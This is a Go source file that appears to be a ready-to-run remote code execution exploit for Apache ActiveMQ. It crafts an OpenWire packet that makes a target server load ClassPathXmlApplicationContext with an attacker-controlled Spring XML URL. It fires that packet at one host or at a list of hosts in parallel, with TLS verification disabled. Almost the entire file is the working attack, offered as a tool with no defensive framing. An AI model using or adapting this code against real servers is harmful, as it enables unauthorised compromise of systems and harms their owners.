package main

import (
	"bufio"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
    "sync"
	"net"
	"os"
	"strconv"
	"strings"
)

func main() {

	var (
		ip     string
		ips    string
		port   string
		url    string
		useTLS bool
        wg      sync.WaitGroup
	)

	flag.StringVar(&ip, "i", "", "ActiveMQ Server IP or Host")
	flag.StringVar(&ips, "l", "", "List of ActiveMQ Servers IPs or Hosts and ports separeted by \\n ex: 1.1.1.1:61616")
	flag.StringVar(&port, "p", "61616", "ActiveMQ Server Port")
	flag.StringVar(&url, "u", "", "Spring XML URL")
	flag.BoolVar(&useTLS, "t", false, "Use TLS for connection")
	flag.Parse()

	banner()

	if url == "" || ip != "" && ips != "" {
		flag.Usage()
		return
	}

	className := "org.springframework.context.support.ClassPathXmlApplicationContext"
	message := url

	header := "1f00000000000000000001"
	body := header + "01" + int2Hex(len(className), 4) + string2Hex(className) + "01" + int2Hex(len(message), 4) + string2Hex(message)
	payload := int2Hex(len(body)/2, 8) + body
	data, _ := hex.DecodeString(payload)

	fmt.Println("[*] XML URL:", url)

	if ip != "" {
		fmt.Println("[*] Sending packet:", payload)
        wg.Add(1)
		scan(useTLS, ip, port, data,&wg)
    } else if ips != "" {
		fmt.Println("[*] Targets list:", ips+"\n")
		targets, err := os.Open(ips)

		defer targets.Close()

		if err != nil {
			fmt.Println("[-] Failed reading:"+ips, err)
			return
		}


		scanner := bufio.NewScanner(targets)
		fmt.Println("[*] Sending packet:", payload)
		for scanner.Scan() {
			target := scanner.Text()
			tg := strings.Split(target, ":")
            wg.Add(1)
			go scan(useTLS, tg[0], tg[1], data, &wg)
		}
        wg.Wait()

	}

}

func scan(useTLS bool, ip string, port string, data []byte,wg *sync.WaitGroup) {

	fmt.Println("[*] Target:", ip+":"+port)
	var conn net.Conn
	var err error

	if useTLS {
		conf := &tls.Config{
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", ip+":"+port, conf)
	} else {
		conn, err = net.Dial("tcp", ip+":"+port)
	}

	if err != nil {
		fmt.Println("[-] Connection error:", err)
		return
	}

	conn.Write(data)
	conn.Close()
    wg.Done()

}

func banner() {
	fmt.Println("     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n")
}

func string2Hex(s string) string {
	return hex.EncodeToString([]byte(s))
}

func int2Hex(i int, n int) string {
	if n == 4 {
		return fmt.Sprintf("%04s", strconv.FormatInt(int64(i), 16))
	} else if n == 8 {
		return fmt.Sprintf("%08s", strconv.FormatInt(int64(i), 16))
	} else {
		panic("n must be 4 or 8")
	}
}
